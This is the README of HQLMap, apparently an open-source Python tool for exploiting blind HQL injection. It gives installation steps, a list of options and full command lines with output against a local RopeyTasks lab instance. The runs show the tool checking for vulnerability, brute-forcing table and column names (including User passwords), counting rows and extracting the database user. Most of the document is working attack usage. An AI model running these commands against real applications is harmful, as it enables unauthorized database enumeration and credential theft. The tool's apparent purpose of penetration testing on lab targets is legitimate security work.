HQLMap
========

This project has been created to exploit Blind HQL Injections. 
The tool has been written in Python and is released under MIT License. 

### Where can you try the tool ? 

If you have a fast environment where you can try the tool, I would recommend using RopeyTasks :
https://github.com/continuumsecurity/RopeyTasks/

Moreover, if you want further information regarding HQLi, check this blog post : 
http://blog.h3xstream.com/2014/02/hql-for-pentesters.html

### Installation

To install this project, you just have to clone this project by typing : 

```
git clone git@github.com:PaulSec/HQLmap.git
```

### Usage

TO use this project, go in the directory :

```
cd HQLmap
```

And launch the project : 

```
python HQLmap.py
```

Usage is then displayed : 

```
Usage: HQLmap.py [options]

Options:
  -h, --help            show this help message and exit
  --url=URL             qURL to pentest
  --cookie=COOKIE       Cookie to test it
  --param=PARAM         Param to test
  --message=BLIND_HQLI_MESSAGE
                        Message appearing while Blind HQLi
  --tables              Tries to gather as much tables as possible (With
                        Bruteforce)
  --T=TABLE             Name of the table you want to get
  --table_name_file=FILE_TABLE
                        DB file for name of tables
  --columns             Tries to gather as much columns as possible (With
                        Bruteforce)
  --C=COLUMN            Name of the column you want to get
  --column_name_file=FILE_COLUMN
                        DB file for name of columns
  --check               Check if host is vulnerable
  --user                Tries to get user() from dbms
  --count               Get count of specified table(s)
  --results             Enumerate results after session
  --verbose             Verbose mode
```

### Usage

This part includes different scenarios. 

### Checking if host is vulnerable
```
python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=D50C4AD5BA0F05FA426CF660D9E069B7" --check
```

The output is really simple : 

```
Host seems vulnerable.
```

### Enumerating tables

```
$ python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=D50C4AD5BA0F05FA426CF660D9E069B7" --tables
```

Here is the output : 

```
[!] Table User has been found.
[!] Table Task has been found.
[-] Table News does not exist.
[-] Table Test does not exist.
```

By performing such enumeration, the scanner is using default file for the name of the tables if not specified. 
The default file is : db/tables.db


### Enumeration columns

```
python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=D50C4AD5BA0F05FA426CF660D9E069B7" --tables --columns
```
```
[!] Table User has been found.
[!] Table Task has been found.
[-] Table News does not exist.
[-] Table Test does not exist.
[!] Column Id has been found in table Task
[-] Column username in Task does not exist.
[-] Column password in Task does not exist.
[!] Column Status has been found in table Task
[-] Column user_id in Task does not exist.
(...)
[!] Column Password has been found in table User
[-] Column status in User does not exist.
[-] Column user_id in User does not exist.
[!] Column Email has been found in table User
[!] Column Firstname has been found in table User
[!] Column Lastname has been found in table User
```

By performing such enumeration, the scanner is using default file for the name of the tables AND for the name of the columns.
Default files are : 

For tables : db/tables.db
For columns : db/columns.db


### Checking existence of a specific table

```
python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=D50C4AD5BA0F05FA426CF660D9E069B7" --T=foo
```

And the output :

```
[-] Table foo does not exist.
```

### Enumerating columns of a specific table


```
python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=D50C4AD5BA0F05FA426CF660D9E069B7" --T=User --columns
```

And the output :

```
[!] Table User has been found.
[!] Column Id has been found in table User
[!] Column Username has been found in table User
[!] Column Password has been found in table User
[-] Column status in User does not exist.
[-] Column user_id in User does not exist.
[!] Column Email has been found in table User
[!] Column Firstname has been found in table User
[!] Column Lastname has been found in table User

```

### Checking the existence of a specific column for a specific table

```
python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=D50C4AD5BA0F05FA426CF660D9E069B7" --T=User --C=bar
```

And the output :

```
[!] Table User has been found.
[-] Column bar in User does not exist.
```

## Fingerprinting options 

### Retrieving the count of a table

```
python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=D50C4AD5BA0F05FA426CF660D9E069B7" --message="Eggs, Milk and Cheese baby, yeah." --T=User --count
```

Or for all tables :

```
python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=D50C4AD5BA0F05FA426CF660D9E069B7" --message="Eggs, Milk and Cheese baby, yeah." --tables --count
```

And the output : 

```
[!] Table User has been found.
[!] Count(*) of User : 3
```

### Retrieving user of the database 

To do such action, you need to specify a table (or all with --tables flag) and add --user flag this way :

```
python HQLmap.py --url="http://localhost:9110/ropeytasks/task/search?q=test&search=Search" --param=q --cookie="JSESSIONID=D50C4AD5BA0F05FA426CF660D9E069B7" --message="Eggs, Milk and Cheese baby, yeah." --T=User --user
```

And the output (after few secs) :

```
[!] Table User has been found.
[!] Username of Database found : SA
```

To retrieve the user, I implemented an algorithm really similar to a "variable" dichotomy. 

### Conclusion (& License)
Feel free to give feedbacks and ask for new features.  

Project released under MIT license. 
